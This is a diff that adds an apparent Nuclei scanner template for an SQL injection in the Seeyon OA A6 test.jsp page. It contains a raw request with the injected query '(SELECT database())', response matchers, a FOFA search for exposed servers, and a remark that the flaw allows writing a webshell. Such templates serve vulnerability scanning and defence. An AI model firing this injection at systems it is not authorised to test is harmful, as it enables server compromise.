@@ -1,0 +1,31 @@
+id: seeyon-a6-test-sqli
+info:
+  name: 致远 OA A6 test.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: body="yyoa" && app="致远互联-OA"
+  tags: seeyon,oa,sqli
+
+http:
+  - raw:
+      - |
+        GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "database"
+          - "序号"
+        condition: and
+
+      - type: status
+        status:
+          - 200
